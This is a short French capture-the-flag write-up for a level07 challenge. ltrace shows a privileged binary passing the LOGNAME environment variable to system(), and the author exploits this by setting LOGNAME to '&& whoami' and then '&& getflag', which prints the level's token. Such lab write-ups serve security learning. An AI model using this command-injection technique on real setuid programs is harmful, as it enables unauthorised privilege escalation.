On trouve dans le dossier home un binaire ./level07, qui, si on le lance nous affiche un message:
<pre><code>> ./level07
level07</code></pre>

On cherche a savoir ce que le binaire fait, pour cela on utilise ltrace:
<pre><code>> ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620
getegid()= 2007
geteuid()= 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)= 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)= 0
getenv("LOGNAME")= "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff62, 0xb7e5ee55, 0xb7fed280)= 18
system("/bin/echo level07 "level07
--- SIGCHLD (Child exited) ---
<... system resumed> )= 0
+++ exited (status 0) +++
</code></pre>

On observe que le binaire fait un **getenv** et appel system pour faire un **echo**

On fait un <code>env</code> pour voir la varibale **LOGNAME**:
<pre><code>> env
...
LOGNAME=level07
...
</code></pre>

On tente de faire une injection avec un <code>whoami</code> pour verifier de un, que l'injection fonctionne, mais aussi pour connaitre les droits avec lesquels le binaire est lancé.

<pre><code>> LOGNAME="&& whoami"
> ./level07

flag07
</code></pre>

>On observe flag07, ce qui veut dire que nous pouvons faire un getflag

<pre><code>> LOGNAME="&& getflag"
> ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
</code></pre>

